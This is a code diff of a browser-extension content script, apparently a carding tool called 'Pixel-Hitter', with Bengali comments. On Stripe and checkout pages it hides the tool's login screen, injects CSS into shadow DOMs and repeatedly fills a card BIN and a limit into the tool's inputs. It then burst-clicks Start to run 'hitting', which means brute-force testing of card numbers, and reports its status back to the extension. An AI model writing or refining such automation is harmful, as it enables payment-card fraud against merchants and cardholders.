@@ -1,60 +1,22 @@
 (function() {
     const DEBUG = true;
-    if (DEBUG) console.log("--- PIXEL-HITTER BRUTE-FORCE: V9 STABLE ---");
+    if (DEBUG) console.log("--- PIXEL-HITTER FINAL V10: INFINITE PERSISTENCE ---");
 
-    const forceCSS = `
-        #app, .app-container, [id*="app-root"] {
-            display: block !important;
-            visibility: visible !important;
-            opacity: 1 !important;
-            width: 350px !important;
-            min-height: 450px !important;
-            max-height: 600px !important;
-            position: fixed !important;
-            bottom: 70px !important;
-            left: 20px !important;
-            z-index: 2147483647 !important;
-            background: #1a1a1a !important;
-            border: 1px solid #333 !important;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important;
-            border-radius: 12px !important;
-            overflow: visible !important;
-        }
-        #loginWrap, .login-wrap, [id*="login"], [class*="login-screen"] {
-            display: none !important;
-            left: -20000px !important;
-            pointer-events: none !important;
-        }
-        #pixelMenu {
-            outline: 4px solid #00ff00 !important;
-            cursor: pointer !important;
-        }
-        /* নিশ্চিত করা যে BIN এরিয়া হাইড করা নয় */
-        #binArea, .bin-content {
-            display: block !important;
-            visibility: visible !important;
-        }
-    `;
-
-    function findInShadows(selector, text = null) {
+    function findRecursive(root, selector, text = null) {
         let found = [];
-        function scan(root) {
-            if (!root) return;
+        function scan(node) {
+            if (!node) return;
             try {
-                if (root.querySelectorAll) {
-                    root.querySelectorAll(selector).forEach(e => {
-                        if (!text || (e.innerText && e.innerText.toLowerCase().includes(text.toLowerCase()))) found.push(e);
+                if (node.querySelectorAll) {
+                    node.querySelectorAll(selector).forEach(e => {
+                        if (!text || (e.innerText && e.innerText.toLowerCase().includes(text.toLowerCase()))) {
+                            found.push(e);
+                        }
                     });
                 }
-                const ch = root.querySelectorAll ? root.querySelectorAll('*') : [];
-                ch.forEach(el => { 
-                    if (el.shadowRoot) {
-                        // শ্যাডো ডমে সিএসএস ইনজেক্ট করা
-                        const s = document.createElement('style');
-                        s.textContent = forceCSS;
-                        el.shadowRoot.appendChild(s);
-                        scan(el.shadowRoot); 
-                    }
+                const ch = node.querySelectorAll ? node.querySelectorAll('*') : [];
+                ch.forEach(el => {
+                    if (el.shadowRoot) scan(el.shadowRoot);
                 });
             } catch(e) {}
         }
@@ -62,58 +24,71 @@
         return found;
     }
 
-    // মেইন পেজে স্টাইল ইনজেক্ট
-    const styleTag = document.createElement('style');
-    styleTag.textContent = forceCSS;
-    document.documentElement.appendChild(styleTag);
+    const setInputValue = (el, val) => {
+        if (!el) return;
+        el.focus();
+        el.value = val;
+        // রিয়েল টাইপিং ইভেন্ট সিমুলেশন
+        el.dispatchEvent(new Event('input', { bubbles: true }));
+        el.dispatchEvent(new Event('change', { bubbles: true }));
+        el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: '8' })); // ট্র্রিগার করার জন্য
+    };
 
-    const bruteForceLoop = () => {
+    const burstClick = (el) => {
+        if (!el) return;
+        ['mousedown', 'click', 'mouseup', 'pointerdown', 'pointerup'].forEach(t => {
+            el.dispatchEvent(new MouseEvent(t, {bubbles: true, cancelable: true, view: window}));
+        });
+        if (el.click) el.click();
+    };
+
+    const persistentLoop = () => {
         if (typeof chrome === 'undefined' || !chrome.storage) return;
 
         chrome.storage.local.get(['currentTask'], (res) => {
             if (!res.currentTask || !res.currentTask.bin) return;
             const task = res.currentTask;
 
-            // ১. মেনু ড্রপডাউন বড় হওয়া নিশ্চিত করা
-            const app = document.getElementById('app') || findInShadows('#app')[0];
-            const menu = document.getElementById('pixelMenu') || findInShadows('div', 'Pixel Menu')[0];
+            // ১. অটো মেকআপ নিশ্চিত (মেনু বড় করা)
+            const app = document.getElementById('app') || findRecursive(document, '#app')[0];
+            const menu = document.getElementById('pixelMenu') || findRecursive(document, 'div', 'Pixel Menu')[0];
 
             if (menu && (!app || app.offsetHeight < 100)) {
-                console.log("[Brute] Menu is too small. Forcing click...");
-                ['mousedown','click','mouseup'].forEach(t => menu.dispatchEvent(new MouseEvent(t, {bubbles:true})));
-                menu.click();
+                burstClick(menu);
             }
 
-            // ২. ইনপুট ও স্টার্ট
-            const binInp = document.getElementById('quickBinInput') || findInShadows('input[placeholder*="BIN"]')[0];
-            const limitInp = document.getElementById('quickLimitInput') || findInShadows('input[id*="Limit"]')[0];
-            const startBtn = document.getElementById('quickBinUseBtn') || findInShadows('button', 'Start')[0];
+            // ২. বিন সেকশনে যাওয়া
+            const binTab = document.getElementById('bin-tab') || findRecursive(document, 'button', '# BIN')[0];
+            if (binTab && !binTab.classList.contains('active')) burstClick(binTab);
 
-            if (binInp && startBtn && !window.bruteTriggered) {
-                binInp.value = task.bin;
-                binInp.dispatchEvent(new Event('input', { bubbles: true }));
-                if (limitInp) {
-                    limitInp.value = task.limit || 10;
-                    limitInp.dispatchEvent(new Event('input', { bubbles: true }));
-                }
+            // ৩. স্ট্যাটাস চেক
+            const statusContent = (app ? app.innerText : "").toLowerCase();
+            const isActive = statusContent.includes("hitting") || statusContent.includes("checking") || statusContent.includes("sending");
 
-                window.bruteTriggered = true;
-                setTimeout(() => {
-                    console.log("[Brute] Launching!");
-                    ['mousedown','click','mouseup'].forEach(t => startBtn.dispatchEvent(new MouseEvent(t, {bubbles:true})));
-                    startBtn.click();
-                    chrome.runtime.sendMessage({ type: "REPORT_LIVE", data: { status: "ACTIVE", bin: task.bin, msg: "Brute-force bypass active. Hitting started." } });
-                }, 1500);
+            if (isActive) {
+                console.log("[V10] Bot is Active. Waiting...");
+                return;
+            }
+
+            // ৪. ইনপুট ও স্টার্ট (বারবার চেষ্টা)
+            const binInp = document.getElementById('quickBinInput') || findRecursive(document, 'input[placeholder*="BIN"]')[0];
+            const limitInp = document.getElementById('quickLimitInput') || findRecursive(document, 'input[id*="Limit"]')[0];
+            const startBtn = document.getElementById('quickBinUseBtn') || findRecursive(document, 'button', 'Start')[0];
+
+            if (binInp && (binInp.value === "" || binInp.value !== task.bin)) {
+                console.log("[V10] Filling BIN...");
+                setInputValue(binInp, task.bin);
+                if (limitInp) setInputValue(limitInp, task.limit || 10);
+            }
+
+            if (startBtn) {
+                console.log("[V10] Retrying Start Button...");
+                burstClick(startBtn);
             }
         });
     };
 
-    // প্রতি ১.৫ সেকেন্ডে হার্টবিট
-    setInterval(() => {
-        findInShadows('nothing'); // শুধু ইনজেকশন ঠিক রাখার জন্য
-        if (window.location.host.includes("stripe") || window.location.host.includes("checkout")) {
-            bruteForceLoop();
-        }
-    }, 1500);
+    // ৩ সেকেন্ড পর পর অবিরাম চেষ্টা
+    setInterval(persistentLoop, 3000);
 
 })();
